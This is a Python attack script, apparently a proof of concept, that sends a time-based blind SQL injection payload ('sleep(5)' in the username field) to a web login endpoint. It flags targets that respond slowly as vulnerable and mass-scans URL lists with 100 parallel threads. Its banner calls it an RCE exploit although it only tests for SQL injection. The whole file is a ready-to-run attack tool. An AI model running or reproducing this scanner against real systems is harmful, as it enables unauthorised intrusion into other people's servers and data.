#https://zy.x1be.com/?v=login
#-*- coding: utf-8 -*-
import argparse,sys,requests,time,os,re
from multiprocessing.dummy import Pool
import urllib.request
requests.packages.urllib3.disable_warnings()

def banner():
    test = """

▓██   ██▓ ▒█████   ███▄    █   ▄████▓██   ██▓ ▒█████   █    ██  ███▄    █  ▄████▄  
 ▒██  ██▒▒██▒  ██▒ ██ ▀█   █  ██▒ ▀█▒▒██  ██▒▒██▒  ██▒ ██  ▓██▒ ██ ▀█   █ ▒██▀ ▀█  
  ▒██ ██░▒██░  ██▒▓██  ▀█ ██▒▒██░▄▄▄░ ▒██ ██░▒██░  ██▒▓██  ▒██░▓██  ▀█ ██▒▒▓█    ▄ 
  ░ ▐██▓░▒██   ██░▓██▒  ▐▌██▒░▓█  ██▓ ░ ▐██▓░▒██   ██░▓▓█  ░██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒
  ░ ██▒▓░░ ████▓▒░▒██░   ▓██░░▒▓███▀▒ ░ ██▒▓░░ ████▓▒░▒▒█████▓ ▒██░   ▓██░▒ ▓███▀ ░
   ██▒▒▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ░▒   ▒   ██▒▒▒ ░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░
 ▓██ ░▒░   ░ ▒ ▒░ ░ ░░   ░ ▒░  ░   ░ ▓██ ░▒░   ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░░   ░ ▒░  ░  ▒   
 ▒ ▒ ░░  ░ ░ ░ ▒     ░   ░ ░ ░ ░   ░ ▒ ▒ ░░  ░ ░ ░ ▒   ░░░ ░ ░    ░   ░ ░ ░        
 ░ ░         ░ ░           ░       ░ ░ ░         ░ ░     ░              ░ ░ ░      
 ░ ░                                 ░ ░                                  ░        

                                       tag:  YongYouNC RCE EXP                                       
                                                     @version: 1.0.0   @author: 有🐟          
"""
    print(test)


def poc(target):
    url = target+"/api/user/login"
    headers = {
        "Cookie": "vsecureSessionID=18380d3f80cd6fa0becbe5b3c08456b1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Te": "trailers",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "102"
    }
    data={
        "captcha":"",
        "password":"21232f297a57a5a743894a0e4a801fc3",
        "username":"admin'and(select*from(select+sleep(5))a)='"
    }


    try:
        # start_time = time.time()
        #
        # # 发送包含注入 payload 的请求
        res = requests.post(url=url, headers=headers,data=data,verify=False)
        i = res.elapsed.total_seconds()
        print(i)
        if i > 5:
            print("存在时间注入漏洞" + target)
        else:
            print("未检测到时间注入漏洞")

        # # 计算请求执行时间
        # end_time = time.time()
        # execution_time = end_time - start_time
        # print(execution_time)
        # # 根据执行时间判断是否存在注入漏洞


        # if time >= 5:  # 假设 5 秒是一个显著的延迟
        #     print("存在时间注入漏洞"+target)
        # else:
        #     print("未检测到时间注入漏洞")


    except Exception as e:
        print(e)





def main():
    banner()
    parser = argparse.ArgumentParser(description='YongYouNC RCE EXP')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()
